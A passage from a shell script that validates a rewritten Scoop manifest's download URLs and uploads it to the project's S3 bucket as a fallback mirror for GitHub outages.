# publish and look fine, and only be discovered during the outage it is for.
if grep -q "$GITHUB_DOWNLOAD_PREFIX" "$manifest_tmp"; then
    die "the Scoop manifest still names GitHub after the rewrite; the URL format in ${manifest_src} has changed"
fi
if ! grep -q "$ORIGIN_PREFIX" "$manifest_tmp"; then
    die "the Scoop manifest names no ${ORIGIN_PREFIX} URL after the rewrite; nothing was repointed"
fi

aws s3 cp "$manifest_tmp" "s3://${BUCKET}/brain/scoop/entire-brain.json" \
    --region "$REGION" \
    --content-type application/json \
    --cache-control "$CACHE_CONTROL" \
    || die "uploading the Scoop manifest failed"

printf 'published brain/scoop/entire-brain.json (urls repointed at %s)\n' "$ORIGIN_PREFIX"
